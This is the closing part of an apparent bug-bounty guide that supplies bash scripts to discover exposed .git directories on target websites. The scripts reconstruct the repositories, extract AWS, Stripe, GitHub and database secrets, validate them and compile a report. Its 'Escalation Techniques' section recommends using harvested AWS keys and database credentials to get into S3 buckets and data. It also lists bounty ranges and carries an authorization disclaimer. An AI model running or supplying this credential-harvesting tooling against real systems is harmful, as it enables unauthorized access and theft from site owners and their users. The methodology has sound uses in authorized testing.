            echo "$target" >> parallel_git_results/found_repos.txt
            
            # Try different Git extraction methods
            git clone "$target/.git" "$output_dir/cloned" 2>/dev/null
            
            if [[ ! -d "$output_dir/cloned" ]]; then
                # Try git-dumper if available
                command -v git-dumper >/dev/null 2>&1 && git-dumper "$target/.git/" "$output_dir/dumped" 2>/dev/null
            fi
            
            # Quick secret scan on any extracted repository
            for repo_dir in "$output_dir"/*; do
                if [[ -d "$repo_dir" ]]; then
                    find "$repo_dir" -name "*.env" -o -name "config.*" -o -name "*.key" 2>/dev/null | head -5 > "$output_dir/sensitive_files.txt"
                    grep -r -E "AKIA[0-9A-Z]{16}" "$repo_dir" 2>/dev/null | head -3 > "$output_dir/aws_keys.txt"
                    break
                fi
            done
        fi
    }
    
    export -f process_single_git_target
    
    # Run parallel processing
    mkdir -p parallel_git_results
    cat "$targets_file" | parallel -j 10 process_single_git_target {}
    
    # Combine results
    find parallel_git_results -name "found_repos.txt" -exec cat {} \; | sort -u > all_git_repos_found.txt
    find parallel_git_results -name "aws_keys.txt" -exec cat {} \; | grep -v "^$" > all_aws_keys_found.txt
    
    echo "📊 Parallel processing completed"
    echo "Git repos found: $(wc -l < all_git_repos_found.txt 2>/dev/null || echo 0)"
    echo "AWS keys found: $(wc -l < all_aws_keys_found.txt 2>/dev/null || echo 0)"
}
```

## 📊 Phase 8: Comprehensive Reporting

### Method 1: Automated Git Exposure Report
```bash
#!/bin/bash
# Generate comprehensive Git exposure report

generate_git_exposure_report() {
    echo "📊 Generating Git exposure report..."
    
    cat > git_exposure_report.md << 'EOF'
# 🔍 Git Repository & Source Code Exposure Report

## 📋 Executive Summary
This report details the Git repository exposures and source code analysis findings during the security assessment.

## 🎯 Methodology
- Git repository discovery (.git directory exposure)
- Complete repository reconstruction
- Source code secret scanning
- Commit history analysis
- Branch and tag enumeration
- Other VCS discovery (SVN, Mercurial, Bazaar)

## 🔍 Findings Summary
EOF
    
    # Add findings count
    if [[ -f "git_exposed_paths.txt" ]]; then
        echo "- **Git Exposures Found:** $(wc -l < git_exposed_paths.txt)" >> git_exposure_report.md
    fi
    
    if [[ -f "secret_analysis/aws_keys.txt" ]]; then
        echo "- **AWS Keys Found:** $(wc -l < secret_analysis/aws_keys.txt)" >> git_exposure_report.md
    fi
    
    if [[ -f "secret_analysis/stripe_live_keys.txt" ]]; then
        echo "- **Stripe Keys Found:** $(wc -l < secret_analysis/stripe_live_keys.txt)" >> git_exposure_report.md
    fi
    
    if [[ -f "secret_analysis/github_tokens.txt" ]]; then
        echo "- **GitHub Tokens Found:** $(wc -l < secret_analysis/github_tokens.txt)" >> git_exposure_report.md
    fi
    
    # Add detailed findings
    cat >> git_exposure_report.md << 'EOF'

## 🔥 Critical Findings

### 1. Exposed Git Repositories
EOF
    
    if [[ -f "git_exposed_paths.txt" ]]; then
        echo '```' >> git_exposure_report.md
        cat git_exposed_paths.txt >> git_exposure_report.md
        echo '```' >> git_exposure_report.md
    fi
    
    cat >> git_exposure_report.md << 'EOF'

### 2. Extracted Secrets

#### AWS Access Keys
EOF
    
    if [[ -f "secret_analysis/aws_keys.txt" ]]; then
        echo '```' >> git_exposure_report.md
        cat secret_analysis/aws_keys.txt | head -5 >> git_exposure_report.md
        echo '```' >> git_exposure_report.md
    fi
    
    cat >> git_exposure_report.md << 'EOF'

#### Stripe API Keys
EOF
    
    if [[ -f "secret_analysis/stripe_live_keys.txt" ]]; then
        echo '```' >> git_exposure_report.md
        cat secret_analysis/stripe_live_keys.txt | head -5 >> git_exposure_report.md
        echo '```' >> git_exposure_report.md
    fi
    
    cat >> git_exposure_report.md << 'EOF'

#### Database Credentials
EOF
    
    if [[ -f "secret_analysis/database_credentials.txt" ]]; then
        echo '```' >> git_exposure_report.md
        cat secret_analysis/database_credentials.txt | head -5 >> git_exposure_report.md
        echo '```' >> git_exposure_report.md
    fi
    
    cat >> git_exposure_report.md << 'EOF'

### 3. API Endpoints Discovered
EOF
    
    if [[ -f "api_endpoints_rest.txt" ]]; then
        echo '```' >> git_exposure_report.md
        cat api_endpoints_rest.txt | head -10 >> git_exposure_report.md
        echo '```' >> git_exposure_report.md
    fi
    
    cat >> git_exposure_report.md << 'EOF'

## 🛠️ Remediation Recommendations

1. **Remove .git Directories**: Ensure .git directories are not accessible via web
2. **Rotate Exposed Secrets**: Immediately rotate all exposed API keys and credentials
3. **Implement Access Controls**: Use proper web server configurations to block VCS directories
4. **Secret Management**: Use environment variables and secret management systems
5. **Regular Audits**: Conduct regular audits for exposed version control systems
6. **Developer Training**: Train developers on secure coding practices

## 📊 Impact Assessment

- **Confidentiality**: Critical - Complete source code and secrets exposure
- **Integrity**: High - Potential for code manipulation and backdoors
- **Availability**: Medium - Possible service disruption through credential abuse

## 🔗 References

- OWASP Top 10 - Security Misconfiguration
- CWE-200: Information Exposure
- NIST Cybersecurity Framework
- Git Security Best Practices
EOF
    
    echo "✅ Report generated: git_exposure_report.md"
}
```

## 🚀 Complete Elite Git Hunter Script

```bash
#!/bin/bash
# Complete Git repository exposure hunting script
# Save as elite_git_hunter.sh

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./elite_git_hunter.sh https://target.com"
    exit 1
fi

echo "🔥 Elite Git Hunter - Starting comprehensive Git exposure scan for $TARGET"
echo "=================================================================="

# Create working directory
WORK_DIR="git_hunt_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

# Phase 1: Basic Git Discovery
echo "📋 Phase 1: Basic Git repository discovery..."
../git_discovery.sh "$TARGET"

# Phase 2: Advanced Git Object Discovery
echo "🔍 Phase 2: Advanced Git object discovery..."
discover_git_objects "$TARGET"
analyze_git_index "$TARGET"

# Phase 3: Repository Reconstruction
echo "📥 Phase 3: Repository reconstruction..."
manual_git_clone "$TARGET"

# If GitHacker is available, use it
if command -v python3 >/dev/null 2>&1; then
    echo "🔧 Using GitHacker for reconstruction..."
    # use_githacker "$TARGET"
fi

# If git-dumper is available, use it
if command -v git-dumper >/dev/null 2>&1; then
    echo "🔧 Using git-dumper for reconstruction..."
    use_git_dumper "$TARGET"
fi

# Phase 4: Source Code Analysis
echo "🔬 Phase 4: Source code analysis..."
for repo_dir in cloned_* dumped_* reconstructed_*; do
    if [[ -d "$repo_dir" ]]; then
        echo "Analyzing repository: $repo_dir"
        scan_secrets_in_code "$repo_dir"
        analyze_git_history "$repo_dir"
        analyze_branches_tags "$repo_dir"
        analyze_stash_reflog "$repo_dir"
        discover_api_endpoints "$repo_dir"
        break
    fi
done

# Phase 5: Other VCS Discovery
echo "🔍 Phase 5: Other version control systems..."
discover_svn_repos "$TARGET"
discover_hg_repos "$TARGET"
discover_bzr_repos "$TARGET"

# Phase 6: Secret Validation
echo "🧪 Phase 6: Secret validation..."
validate_extracted_secrets
test_database_connections

# Phase 7: Reporting
echo "📊 Phase 7: Generating comprehensive report..."
generate_git_exposure_report

echo "✅ Elite Git Hunt completed!"
echo "📁 Results saved in: $WORK_DIR"
echo "📄 Report available: git_exposure_report.md"

# Summary
echo ""
echo "📊 SUMMARY:"
echo "=========="
echo "Git exposures found: $(wc -l < git_exposed_paths.txt 2>/dev/null || echo 0)"
echo "SVN exposures found: $(wc -l < svn_exposed_paths.txt 2>/dev/null || echo 0)"
echo "Mercurial exposures found: $(wc -l < hg_exposed_paths.txt 2>/dev/null || echo 0)"
echo "AWS keys found: $(wc -l < secret_analysis/aws_keys.txt 2>/dev/null || echo 0)"
echo "Stripe keys found: $(cat secret_analysis/stripe_*_keys.txt 2>/dev/null | wc -l || echo 0)"
echo "GitHub tokens found: $(wc -l < secret_analysis/github_tokens.txt 2>/dev/null || echo 0)"
echo "Database credentials found: $(wc -l < secret_analysis/database_credentials.txt 2>/dev/null || echo 0)"
echo "API endpoints found: $(wc -l < api_endpoints_rest.txt 2>/dev/null || echo 0)"
```

## 💡 Pro Tips for Maximum Impact

### 1. **High-Value Targets**
- Look for .git directories in subdirectories (/admin/.git, /api/.git)
- Check for Git repositories in backup directories
- Test different branches (develop, staging, test)
- Look for stashed changes with sensitive data

### 2. **Common Developer Mistakes**
- Committing .env files with production credentials
- Hardcoding API keys in source code
- Leaving debug/test files with sensitive data
- Not properly configuring web server to block .git access

### 3. **Escalation Techniques**
- Use found AWS keys to access S3 buckets
- Use database credentials for data access
- Use API keys to access third-party services
- Analyze source code for additional vulnerabilities

### 4. **Advanced Techniques**
- Check Git hooks for additional scripts
- Look for Git submodules with separate repositories
- Analyze Git LFS (Large File Storage) for sensitive files
- Check for Git worktrees with different branches

## 🎯 Expected Bounty Range: $200 - $1000+

**Medium Impact ($200-400):**
- Basic Git directory exposure
- Source code without sensitive data
- Non-production credentials

**High Impact ($400-700):**
- Production credentials in Git history
- API keys with significant access
- Database credentials
- Complete application source code

**Critical Impact ($700-1000+):**
- AWS/Cloud credentials with admin access
- Production database access
- Multiple high-value secrets
- Source code with additional vulnerabilities

## ⚠️ Legal Disclaimer
This methodology is for authorized security testing only. Always ensure you have proper permission before testing any systems. Unauthorized access to version control systems is illegal and unethical.

---
**Created by Elite Bug Bounty Hunter | Follow responsible disclosure practices**
